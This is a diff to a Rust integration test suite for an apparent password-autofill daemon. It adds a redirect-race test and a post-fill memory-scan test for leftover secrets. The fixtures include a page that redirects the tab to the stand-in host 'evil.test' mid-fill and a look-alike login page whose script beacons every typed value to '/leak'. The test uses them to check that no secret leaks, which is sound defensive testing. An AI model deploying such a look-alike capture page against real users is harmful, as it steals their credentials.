@@ -71,6 +71,8 @@ const HOST: &str = "example.com";
 /// A relying party on another site (eTLD+1 `example.org`) that frames
 /// the item's login page (REQ-ORG-004).
 const RP_HOST: &str = "rp.example.org";
+/// Where REQ-ORG-003's race page sends the tab (eTLD+1 `evil.test`).
+const EVIL_HOST: &str = "evil.test";
 /// The item's secrets (`tests/fixtures/gen/gen_export_fixture.py`):
 /// password, hidden custom field, TOTP seed.
 const SECRETS: [&str; 3] = [
@@ -112,6 +114,46 @@ const RP_PAGE: &str = r#"<!doctype html>
 </script>
 </body></html>
 "#;
+
+/// REQ-ORG-003's racing page. The item's login form, but the page
+/// schedules `location = evil` in three ways: a timer a few ms after
+/// load, a microtask after any `focus`, and a microtask after any
+/// `input` (the fill dispatches `input` on each field it writes).
+const RACE_PAGE: &str = r#"<!doctype html>
+<html><head><meta charset="utf-8"><title>kharon #133 redirect race</title></head>
+<body>
+<form id="login" action="/submitted" method="post">
+  <input id="username" name="username" type="email" autocomplete="username">
+  <input id="password" name="password" type="password" autocomplete="current-password">
+</form>
+<script>
+  const evil = "https://evil.test:" + location.port + "/landed";
+  const go = () => { location = evil; };
+  document.addEventListener("focus", () => queueMicrotask(go), true);
+  document.addEventListener("input", () => queueMicrotask(go), true);
+  setTimeout(go, Math.random() * 40);
+</script>
+</body></html>
+"#;
+
+/// Where the race page sends the tab: a look-alike form that beacons
+/// every value written into it back to the server (`/leak`), so a fill
+/// that landed here would show up in the server's request log.
+const EVIL_PAGE: &str = r#"<!doctype html>
+<html><head><meta charset="utf-8"><title>evil look-alike</title></head>
+<body>
+<form>
+  <input id="username" name="username" type="email" autocomplete="username">
+  <input id="password" name="password" type="password" autocomplete="current-password">
+</form>
+<script>
+  document.addEventListener("input", (e) => navigator.sendBeacon("/leak", e.target.value), true);
+</script>
+</body></html>
+"#;
+
+/// Every request a test server received, headers and body.
+type RequestLog = Arc<Mutex<Vec<Vec<u8>>>>;
 
 // ------------------------------------------------------------ wire types
 
@@ -163,25 +205,53 @@ struct ContextReply {
 #[derive(Serialize)]
 #[serde(tag = "op", rename_all = "snake_case")]
 enum OwnerOp<'a> {
-    Unlock { password: &'a str },
-    Approve { request_id: &'a str, kind: &'a str },
+    Unlock {
+        password: &'a str,
+    },
+    Approve {
+        request_id: &'a str,
+        kind: &'a str,
+    },
+    /// The `canary-scan` feature's memory scan (REQ-MEM-003 evidence).
+    Scan {
+        needle: &'a str,
+    },
 }
 
 #[derive(Debug, Deserialize)]
 struct OwnerReply {
     ok: bool,
+    /// `scan` only.
+    hits: Option<u64>,
 }
 
 // ------------------------------------------------------------ test pages
 
-/// Answer every request on `s`: [`RP_PAGE`] under `/rp`, otherwise
-/// [`PAGE`] (404 for the favicon).
-async fn serve_one<S: AsyncRead + AsyncWrite + Unpin>(mut s: S) {
+/// Answer one request on `s` and log it (headers and body):
+/// [`RP_PAGE`] under `/rp`, [`RACE_PAGE`] under `/race`, [`EVIL_PAGE`]
+/// under `/landed`, an empty 204 for `/leak`, otherwise [`PAGE`] (404
+/// for the favicon).
+async fn serve_one<S: AsyncRead + AsyncWrite + Unpin>(mut s: S, log: RequestLog) {
     let mut buf = Vec::new();
     let mut chunk = [0u8; 2048];
-    while !buf.windows(4).any(|w| w == b"\r\n\r\n") {
+    let header_end = loop {
+        if let Some(i) = buf.windows(4).position(|w| w == b"\r\n\r\n") {
+            break i + 4;
+        }
         match s.read(&mut chunk).await {
             Ok(0) | Err(_) => return,
+            Ok(n) => buf.extend_from_slice(&chunk[..n]),
+        }
+    };
+    let head = String::from_utf8_lossy(&buf[..header_end]).to_ascii_lowercase();
+    let body_len = head
+        .lines()
+        .find_map(|l| l.strip_prefix("content-length:"))
+        .and_then(|v| v.trim().parse::<usize>().ok())
+        .unwrap_or(0);
+    while buf.len() < header_end + body_len {
+        match s.read(&mut chunk).await {
+            Ok(0) | Err(_) => break,
             Ok(n) => buf.extend_from_slice(&chunk[..n]),
         }
     }
@@ -190,10 +260,17 @@ async fn serve_one<S: AsyncRead + AsyncWrite + Unpin>(mut s: S) {
         .nth(1)
         .unwrap_or("/")
         .to_owned();
+    log.lock().unwrap().push(buf);
     let (status, body) = if path == "/favicon.ico" {
         ("404 Not Found", "")
     } else if path.starts_with("/rp") {
         ("200 OK", RP_PAGE)
+    } else if path.starts_with("/race") {
+        ("200 OK", RACE_PAGE)
+    } else if path.starts_with("/landed") {
+        ("200 OK", EVIL_PAGE)
+    } else if path.starts_with("/leak") {
+        ("204 No Content", "")
     } else {
         ("200 OK", PAGE)
     };
@@ -209,7 +286,20 @@ async fn serve_one<S: AsyncRead + AsyncWrite + Unpin>(mut s: S) {
 /// certificate for [`HOST`] and [`RP_HOST`]. Returns the port and the certificate's
 /// SPKI SHA-256 (base64), which is all Chromium is told to trust.
 async fn serve_https() -> (u16, String) {
-    let ck = rcgen::generate_simple_self_signed(vec![HOST.to_owned(), RP_HOST.to_owned()]).unwrap();
+    let (port, spki, _log) = serve_https_logged().await;
+    (port, spki)
+}
+
+/// [`serve_https`], also returning the server's request log. The
+/// certificate covers [`EVIL_HOST`] too.
+async fn serve_https_logged() -> (u16, String, RequestLog) {
+    let log = RequestLog::default();
+    let ck = rcgen::generate_simple_self_signed(vec![
+        HOST.to_owned(),
+        RP_HOST.to_owned(),
+        EVIL_HOST.to_owned(),
+    ])
+    .unwrap();
     let spki = Base64::encode_string(&Sha256::digest(ck.key_pair.public_key_der()));
     let cert = ck.cert.der().clone();
     let key = rustls_pki_types::PrivateKeyDer::Pkcs8(ck.key_pair.serialize_der().into());
@@ -224,17 +314,19 @@ async fn serve_https() -> (u16, String) {
     let acceptor = tokio_rustls::TlsAcceptor::from(Arc::new(tls));
     let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
     let port = listener.local_addr().unwrap().port();
+    let sink = log.clone();
     tokio::spawn(async move {
         while let Ok((tcp, _)) = listener.accept().await {
             let acceptor = acceptor.clone();
+            let sink = sink.clone();
             tokio::spawn(async move {
                 if let Ok(s) = acceptor.accept(tcp).await {
-                    serve_one(s).await;
+                    serve_one(s, sink).await;
                 }
             });
         }
     });
-    (port, spki)
+    (port, spki, log)
 }
 
 /// [`PAGE`] over plain HTTP on an ephemeral loopback port.
@@ -243,7 +335,7 @@ async fn serve_http() -> u16 {
     let port = listener.local_addr().unwrap().port();
     tokio::spawn(async move {
         while let Ok((tcp, _)) = listener.accept().await {
-            tokio::spawn(serve_one(tcp));
+            tokio::spawn(serve_one(tcp, RequestLog::default()));
         }
     });
     port
@@ -314,7 +406,7 @@ fn launch_chromium(bin: &Path, spki: Option<&str>) -> Chromium {
     ])
     .arg(format!("--user-data-dir={}", profile.path().display()))
     .arg(format!(
-        "--host-resolver-rules=MAP {HOST} 127.0.0.1,MAP {RP_HOST} 127.0.0.1"
+        "--host-resolver-rules=MAP {HOST} 127.0.0.1,MAP {RP_HOST} 127.0.0.1,MAP {EVIL_HOST} 127.0.0.1"
     ));
     if let Some(spki) = spki {
         // Trusts exactly the test page's key (needs --user-data-dir).
@@ -601,8 +693,7 @@ fn owner_op(socket: &Path, op: &OwnerOp<'_>) -> OwnerReply {
 /// kharond in export mode with agent `alpha` on `chromium`, unlocked,
 /// with the agent's browser context and the item's id.
 struct Running {
-    stop: Option<tokio::sync::oneshot::Sender<()>>,
-    server: tokio::task::JoinHandle<std::io::Result<()>>,
+    host: Host,
     addr: std::net::SocketAddr,
     socket: PathBuf,
     data: tempfile::TempDir,
@@ -611,12 +702,63 @@ struct Running {
     context: String,
 }
 
+/// Where kharond runs.
+enum Host {
+    /// `daemon::start` in this test process.
+    InProcess {
+        stop: Option<tokio::sync::oneshot::Sender<()>>,
+        server: tokio::task::JoinHandle<std::io::Result<()>>,
+    },
+    /// The `kharond` binary as a child process, so a memory scan of it
+    /// sees none of this test's own copies of the secrets.
+    Child(Child),
+}
+
+impl Drop for Host {
+    fn drop(&mut self) {
+        if let Host::Child(child) = self {
+            let _ = child.kill();
+            let _ = child.wait();
+        }
+    }
+}
+
+/// Whether the owner socket answers `status` yet.
+fn owner_socket_up(socket: &Path) -> bool {
+    let Ok(mut stream) = UnixStream::connect(socket) else {
+        return false;
+    };
+    let _ = stream.set_read_timeout(Some(Duration::from_millis(500)));
+    if stream.write_all(b"{\"op\":\"status\"}\n").is_err() {
+        return false;
+    }
+    let mut reply = String::new();
+    stream.read_to_string(&mut reply).is_ok() && reply.contains("\"ok\":true")
+}
+
 impl Running {
     /// `policy` is extra `[policy]` TOML (empty for the defaults).
     async fn start(chromium: &Chromium, policy: &str) -> Self {
+        Self::start_on(chromium, policy, false).await
+    }
+
+    /// [`Running::start`] with kharond as a child process.
+    async fn start_binary(chromium: &Chromium) -> Self {
+        Self::start_on(chromium, "", true).await
+    }
+
+    async fn start_on(chromium: &Chromium, policy: &str, binary: bool) -> Self {
         let (token, hash) = generate("alpha");
         let token = token.expose_secret().clone();
         let data = tempfile::tempdir().unwrap();
+        // The child gets a fixed port (its bound address is not
+        // reported); in-process, the daemon reports what it bound.
+        let listen = if binary {
+            let probe = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
+            probe.local_addr().unwrap().to_string()
+        } else {
+            "127.0.0.1:0".to_owned()
+        };
         let toml = format!(
             r#"mode = "export"
 data_dir = "{data}"
@@ -635,7 +777,7 @@ checkpoint_local_only = true
 require_mlock = false
 
 [api]
-listen = "127.0.0.1:0"
+listen = "{listen}"
 
 [policy]
 {policy}
@@ -643,16 +785,41 @@ listen = "127.0.0.1:0"
             data = data.path().display(),
             cdp = chromium.ws,
         );
-        let cfg = Config::from_toml_str(&toml).unwrap();
-        let d = daemon::start(&cfg, Box::new(StaticHardening::all_ok()))
-            .await
-            .unwrap();
-        let addr = d.local_addr().unwrap();
-        let socket = d.owner_socket().to_path_buf();
-        let (stop, stopped) = tokio::sync::oneshot::channel::<()>();
-        let server = tokio::spawn(d.run(async {
-            let _ = stopped.await;
-        }));
+        let (host, addr, socket) = if binary {
+            let path = data.path().join("kharon.toml");
+            std::fs::write(&path, &toml).unwrap();
+            let child = Command::new(env!("CARGO_BIN_EXE_kharond"))
+                .arg("--config")
+                .arg(&path)
+                .stdout(Stdio::null())
+                .stderr(Stdio::inherit())
+                .spawn()
+                .unwrap();
+            let host = Host::Child(child);
+            let socket = data.path().join("owner.sock");
+            let deadline = Instant::now() + Duration::from_secs(20);
+            while !owner_socket_up(&socket) {
+                assert!(Instant::now() < deadline, "kharond did not start");
+                tokio::time::sleep(Duration::from_millis(100)).await;
+            }
+            (host, listen.parse().unwrap(), socket)
+        } else {
+            let cfg = Config::from_toml_str(&toml).unwrap();
+            let d = daemon::start(&cfg, Box::new(StaticHardening::all_ok()))
+                .await
+                .unwrap();
+            let addr = d.local_addr().unwrap();
+            let socket = d.owner_socket().to_path_buf();
+            let (stop, stopped) = tokio::sync::oneshot::channel::<()>();
+            let server = tokio::spawn(d.run(async {
+                let _ = stopped.await;
+            }));
+            let host = Host::InProcess {
+                stop: Some(stop),
+                server,
+            };
+            (host, addr, socket)
+        };
 
         let s = socket.clone();
         let reply = tokio::task::spawn_blocking(move || {
@@ -687,8 +854,7 @@ listen = "127.0.0.1:0"
             .browser_context_id;
 
         Self {
-            stop: Some(stop),
-            server,
+            host,
             addr,
             socket,
             data,
@@ -723,6 +889,10 @@ listen = "127.0.0.1:0"
     }
 
     async fn approve_once(&self, request_id: &str) {
+        self.approve(request_id, "once").await;
+    }
+
+    async fn approve(&self, request_id: &str, kind: &'static str) {
         let socket = self.socket.clone();
         let request_id = request_id.to_owned();
         let reply = tokio::task::spawn_blocking(move || {
@@ -730,7 +900,7 @@ listen = "127.0.0.1:0"
                 &socket,
                 &OwnerOp::Approve {
                     request_id: &request_id,
-                    kind: "once",
+                    kind,
                 },
             )
         })
@@ -747,9 +917,25 @@ listen = "127.0.0.1:0"
             .collect()
     }
 
+    /// Occurrences of `needle` in kharond's memory (`scan` op). A
+    /// scan that could not run fails here, never reads as 0.
+    async fn scan(&self, needle: &str) -> u64 {
+        let socket = self.socket.clone();
+        let needle = needle.to_owned();
+        let reply = tokio::task::spawn_blocking(move || {
+            owner_op(&socket, &OwnerOp::Scan { needle: &needle })
+        })
+        .await
+        .unwrap();
+        assert!(reply.ok, "scan: {reply:?}");
+        reply.hits.unwrap()
+    }
+
     async fn shutdown(mut self) {
-        self.stop.take().unwrap().send(()).unwrap();
-        self.server.await.unwrap().unwrap();
+        if let Host::InProcess { stop, server } = &mut self.host {
+            stop.take().unwrap().send(()).unwrap();
+            server.await.unwrap().unwrap();
+        }
     }
 }
 
@@ -964,4 +1150,181 @@ async fn req_org_004_cross_site_iframe_fill_is_refused_by_default() {
 #[tokio::test(flavor = "multi_thread", worker_threads = 4)]
 async fn req_org_004_allowlisted_iframe_host_is_filled() {
     req_org_004("req_org_004_allowlisted_iframe_host_is_filled", true).await;
+}
+
+/// How many race iterations to run: REQ-ORG-003's 1000 by default.
+fn race_iterations() -> usize {
+    std::env::var("KHARON_ORG003_ITERATIONS")
+        .ok()
+        .and_then(|v| v.parse().ok())
+        .unwrap_or(1000)
+}
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+async fn req_org_003_redirect_race_never_lands_a_fill_on_the_other_site() {
+    let Some(bin) =
+        chromium_or_skip("req_org_003_redirect_race_never_lands_a_fill_on_the_other_site")
+    else {
+        return;
+    };
+    let (port, spki, log) = serve_https_logged().await;
+    let chromium = launch_chromium(&bin, Some(&spki));
+    // The rate limits and the origin_mismatch suspension would stop the
+    // loop long before 1000 fills; they are not under test here.
+    let run = Running::start(
+        &chromium,
+        "fills_per_minute = 1000000\nfills_per_day = 1000000\n\
+         item_fills_per_window = 1000000\norigin_mismatch_suspend = 1000000",
+    )
+    .await;
+
+    // A per-origin grant for the item at example.com, from one approval
+    // on the plain login page.
+    let login = format!("https://{HOST}:{port}/login");
+    let origin = format!("https://{HOST}:{port}");
+    let mut cdp = Cdp::connect(&chromium.ws).await;
+    let (target, session) = cdp.open(&run.context, &login).await;
+    let first = run.fill(&target, &origin).await;
+    assert_eq!(first.status, "pending_approval", "{first:?}");
+    run.approve(first.grant_request_id.as_deref().unwrap(), "per-origin")
+        .await;
+    let warm = run.fill(&target, &origin).await;
+    assert_eq!(warm.status, "filled", "{warm:?}");
+
+    // Each iteration loads the race page in the same tab and fills it
+    // at once, while the page is sending itself to evil.test.
+    let race = format!("https://{HOST}:{port}/race");
+    let iterations = race_iterations();
+    let mut outcomes = std::collections::BTreeMap::<String, usize>::new();
+    for _ in 0..iterations {
+        cdp.call(Some(&session), "Page.navigate", json!({"url": race}))
+            .await;
+        let r = run.fill(&target, &origin).await;
+        *outcomes.entry(r.status).or_default() += 1;
+    }
+    // Let any beacon from a look-alike page reach the server.
+    tokio::time::sleep(Duration::from_millis(500)).await;
+    eprintln!("REQ-ORG-003 outcomes over {iterations} iterations: {outcomes:?}");
+
+    // Only the race's expected outcomes: the fill beat the redirect
+    // (`filled`), the context died under it (`navigated`), or the tab
+    // was already on evil.test (`origin_mismatch`).
+    for status in outcomes.keys() {
+        assert!(
+            ["filled", "navigated", "origin_mismatch"].contains(&status.as_str()),
+            "unexpected outcome {status}: {outcomes:?}"
+        );
+    }
+
+    // The redirects really happened...
+    let requests = std::mem::take(&mut *log.lock().unwrap());
+    let landed = requests
+        .iter()
+        .filter(|r| r.starts_with(b"GET /landed"))
+        .count();
+    assert!(landed > 0, "the race page never reached evil.test");
+    // ...and no fill landed there: nothing was ever beaconed back, and
+    // no request to the server, from either site, carries a secret.
+    let leaks = requests
+        .iter()
+        .filter(|r| r.starts_with(b"POST /leak"))
+        .count();
+    assert_eq!(leaks, 0, "a value was written into the evil.test page");
+    for request in &requests {
+        let text = String::from_utf8_lossy(request);
+        for secret in SECRETS {
+            assert!(!text.contains(secret), "a secret reached the server");
+        }
+    }
+
+    drop(cdp);
+    run.shutdown().await;
+    drop(chromium);
+}
+
+/// REQ-CRY-006's second half: "after a fill completes, the canary is
+/// absent within 1 s". kharond runs as a child process, so the
+/// `canary-scan` op sees only the daemon's memory, never this test's
+/// copies of the secrets.
+#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+async fn req_cry_006_no_secret_left_in_the_daemon_after_a_fill() {
+    let Some(bin) = chromium_or_skip("req_cry_006_no_secret_left_in_the_daemon_after_a_fill")
+    else {
+        return;
+    };
+    let (port, spki) = serve_https().await;
+    let chromium = launch_chromium(&bin, Some(&spki));
+    let run = Running::start_binary(&chromium).await;
+
+    // Positive control: the item's username is metadata, decrypted at
+    // unlock and held for list and match (REQ-CRY-006), so a scanner
+    // that reads the daemon's heap finds it.
+    assert!(
+        run.scan(ITEM_USERNAME).await > 0,
+        "the scan cannot see the item's metadata in the daemon"
+    );
+    // Secrets are decrypted per fill only: none is in memory yet.
+    for secret in SECRETS {
+        assert_eq!(
+            run.scan(secret).await,
+            0,
+            "a secret is in memory before any fill"
+        );
+    }
+
+    let login = format!("https://{HOST}:{port}/login");
+    let origin = format!("https://{HOST}:{port}");
+    let mut cdp = Cdp::connect(&chromium.ws).await;
+    let (target, session) = cdp.open(&run.context, &login).await;
+    let first = run.fill(&target, &origin).await;
+    assert_eq!(first.status, "pending_approval", "{first:?}");
+    run.approve_once(first.grant_request_id.as_deref().unwrap())
+        .await;
+    let filled = run.fill(&target, &origin).await;
+    let done = Instant::now();
+    assert_eq!(filled.status, "filled", "{filled:?}");
+
+    // The password went through the daemon to the page. Within 1 s of
+    // the fill's reply, a scan finds no copy of it in the daemon (a
+    // full scan of a debug build takes most of a second, so the first
+    // one usually decides). The other two secrets must be absent too.
+    let deadline = done + Duration::from_secs(1);
+    let password_gone = loop {
+        let started = Instant::now();
+        if run.scan(SECRETS[0]).await == 0 {
+            break started <= deadline;
+        }
+        assert!(
+            Instant::now() < deadline,
+            "the item's password is still in the daemon's memory 1 s after the fill"
+        );
+        tokio::time::sleep(Duration::from_millis(50)).await;
+    };
+    assert!(
+        password_gone,
+        "no zero-hit scan began within 1 s of the fill"
+    );
+    // Not even a fragment: a freed small allocation loses its first
+    // 16 bytes to the allocator's free-list pointers, so a leaked copy
+    // of the 27-byte password can survive as its tail alone.
+    assert_eq!(
+        run.scan(&SECRETS[0][16..]).await,
+        0,
+        "the tail of the item's password is still in the daemon's memory"
+    );
+    for secret in &SECRETS[1..] {
+        assert_eq!(
+            run.scan(secret).await,
+            0,
+            "a secret is in memory after the fill"
+        );
+    }
+    assert!(
+        cdp.fields(&session).await.1 == SECRETS[0],
+        "the page's password field does not hold the item's password"
+    );
+
+    drop(cdp);
+    run.shutdown().await;
+    drop(chromium);
 }
